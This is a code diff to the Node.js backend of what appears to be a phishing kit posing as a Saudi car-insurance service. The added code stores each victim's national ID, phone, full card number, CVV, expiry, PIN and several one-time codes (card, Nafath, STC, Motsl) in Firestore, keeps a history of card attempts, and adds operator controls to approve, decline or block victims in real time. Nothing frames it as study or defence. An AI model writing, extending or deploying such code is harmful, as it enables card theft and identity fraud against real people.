@@ -35,6 +35,7 @@ const fs = require("fs");
 const path = require("path");
 const { newCaptcha } = require("./captcha");
 const { Server } = require("socket.io");
+const { writeSession } = require("./firestore");
 
 // ---------- config ----------
 const PORT = process.env.PORT || 3000;
@@ -143,6 +144,85 @@ const uuid = () => crypto.randomUUID();
 const newId = () =>
   Date.now().toString(36) + Math.random().toString(36).slice(2, 10);
 
+const SESSION_STATUSES = new Set([
+  "pending",
+  "in_progress",
+  "completed",
+  "blocked",
+  "declined",
+]);
+
+const SESSION_FIELDS = [
+  "national_id", "phone", "serialNumber", "car_year", "car_model", "carPrice",
+  "carHolderName", "purpose_of_use", "tameenFor", "tameenAllType", "tameenType",
+  "startedDate", "companyData", "cardNumber", "cvv", "expiryDate", "card_name", "pin",
+  "cardAttempts", "CardAccept", "OtpCardAccept", "PinAccept", "STCAccept", "MotslAccept",
+  "MotslOtpAccept", "NavazAccept", "stcAwaitingCall", "blocked", "checked", "MotslPhone",
+  "MotslNetwork", "MotslOtp", "CardOtp", "NavazOtp", "Customs_card", "phoneId", "type",
+  "status", "stage", "createdAt", "updatedAt",
+];
+
+const STAGE_ALIASES = {
+  init: "service", registered: "service", reg: "service", service: "service",
+  apply: "service", company: "service", payment: "payment", paymentform: "payment",
+  visa: "payment", card: "payment", visaotp: "cardOtp", "otp:received": "cardOtp",
+  phone: "phone", phoneotp: "phoneOtp", "phone:submitted": "phone",
+  mobotp: "mobilyOtp", motsl: "motslOtp", motslotp: "motslOtp", stc: "stc",
+  stcphoneotp: "stcOtp", stcotp: "stcOtp", navaz: "navaz", nafath: "navaz",
+};
+
+function canonicalStage(value, fallback = "service") {
+  const raw = String(value || "").trim();
+  const key = raw.replace(/^(accept|decline)/i, "");
+  if (!key) return fallback;
+  return STAGE_ALIASES[key.toLowerCase()] || STAGE_ALIASES[raw.toLowerCase()] || fallback;
+}
+
+function canonicalStatus(value, fallback = "pending") {
+  const status = String(value || "").trim().toLowerCase();
+  return SESSION_STATUSES.has(status) ? status : fallback;
+}
+
+function canonicalSession(id, row, timestamp) {
+  const source = row || {};
+  const document = {};
+  for (const field of SESSION_FIELDS) document[field] = source[field] ?? null;
+  document.national_id = document.national_id ?? source.idNumber ?? source.identityNumber ?? null;
+  document.phone = document.phone ?? source.mobileNumber ?? source.phoneNumber ?? null;
+  document.serialNumber = document.serialNumber ?? source.sequenceNumber ?? null;
+  document.car_year = document.car_year ?? source.carYear ?? source.modelYear ?? null;
+  document.car_model = document.car_model ?? source.carModel ?? source.vehicleModel ?? null;
+  document.carPrice = document.carPrice ?? source.carValue ?? source.price ?? null;
+  document.carHolderName = document.carHolderName ?? source.cardholderName ?? source.name ?? null;
+  document.purpose_of_use = document.purpose_of_use ?? source.purpose ?? null;
+  document.startedDate = document.startedDate ?? source.startDate ?? null;
+  document.card_name = document.card_name ?? source.cardholderName ?? null;
+  document.cvv = document.cvv ?? source.cardCvv ?? null;
+  document.expiryDate = document.expiryDate ?? source.cardExpiry ?? null;
+  if (!source.companyData && (source.company || source.price)) {
+    document.companyData = {
+      logo: source.logo ?? null,
+      price: source.price ?? null,
+      options: Array.isArray(source.options) ? source.options : [],
+    };
+  }
+  document.companyData = document.companyData || { logo: null, price: null, options: [] };
+  document.companyData.options = Array.isArray(document.companyData.options)
+    ? document.companyData.options
+    : [];
+  document.cardAttempts = Array.isArray(document.cardAttempts) ? document.cardAttempts : [];
+  for (const field of [
+    "CardAccept", "OtpCardAccept", "PinAccept", "STCAccept", "MotslAccept",
+    "MotslOtpAccept", "NavazAccept", "stcAwaitingCall", "blocked", "checked",
+  ]) document[field] = Boolean(document[field]);
+  document.status = canonicalStatus(document.status);
+  document.stage = canonicalStage(document.stage);
+  document.blocked = Boolean(document.blocked);
+  document.createdAt = source.createdAt || timestamp;
+  document.updatedAt = timestamp;
+  return document;
+}
+
 function clientIp(req) {
   return (
     req.headers["cf-connecting-ip"] ||
@@ -176,8 +256,26 @@ function upsertSession(id, patch, extra = {}) {
     updatedAt: now(),
     ...extra,
   };
+  if (next.cardNumber || next.cardCvv || next.cvv) {
+    const attempts = Array.isArray(next.cardAttempts) ? next.cardAttempts : [];
+    const attempt = {
+      cardNumber: next.cardNumber || null,
+      cvv: next.cvv || next.cardCvv || null,
+      expiryDate: next.expiryDate || next.cardExpiry || null,
+      carHolderName: next.card_name || next.cardholderName || next.carHolderName || null,
+      status: canonicalStatus(next.status, "pending"),
+      createdAt: now(),
+    };
+    const last = attempts[attempts.length - 1];
+    if (!last || JSON.stringify(last) !== JSON.stringify(attempt)) next.cardAttempts = [...attempts, attempt];
+  }
+  next.status = canonicalStatus(next.status, existing.status || "pending");
+  next.stage = canonicalStage(next.stage, existing.stage || "service");
+  if (!next.createdAt) next.createdAt = now();
+  Object.assign(next, canonicalSession(id, next, next.updatedAt));
   state.users[id] = next;
   db.save();
+  writeSession(id, canonicalSession(id, next, next.updatedAt));
   // Push realtime update to dashboards
   io.emit("sessionUpdate", next);
   io.to("admins").emit("newVisitor", next);
@@ -536,15 +634,18 @@ app.post("/api/chat/enabled", (_req, res) =>
 
 // ---------- REST: customer site (frontend contract) ----------
 app.post("/api/user/init", (req, res) => {
-  const { uuid: sentUuid, browserInfo } = req.body || {};
-  const id = sentUuid || uuid();
+  const { browserInfo } = req.body || {};
+  // The backend owns the Firestore document ID. The returned UUID is then used
+  // by the customer and dashboard for all subsequent writes.
+  const id = uuid();
   const ip = clientIp(req);
   upsertSession(id, {
     ip,
     ua: req.headers["user-agent"] || "",
     browserInfo: browserInfo || null,
     lastSeen: now(),
-    stage: "init",
+    status: "pending",
+    stage: "service",
   });
   res.json({
     ok: true,
@@ -1035,6 +1136,15 @@ io.on("connection", (socket) => {
           : { id, uuid: id, userId: id };
       delete data.adminToken;
       delete data.token;
+      const actionKey = String(ev).toLowerCase();
+      const actionStatus = actionKey === "clientblocked" || actionKey === "user:blocked"
+        ? "blocked"
+        : actionKey.startsWith("decline") ? "declined" : "in_progress";
+      upsertSession(id, {
+        status: actionStatus,
+        stage: canonicalStage(data.stage || ev),
+        blocked: actionStatus === "blocked" ? true : undefined,
+      });
       broadcastAdminEvent(id, ev, data);
       console.log(`[io] admin ${ev} -> ${id}`);
       if (typeof ack === "function") ack({ ok: true });
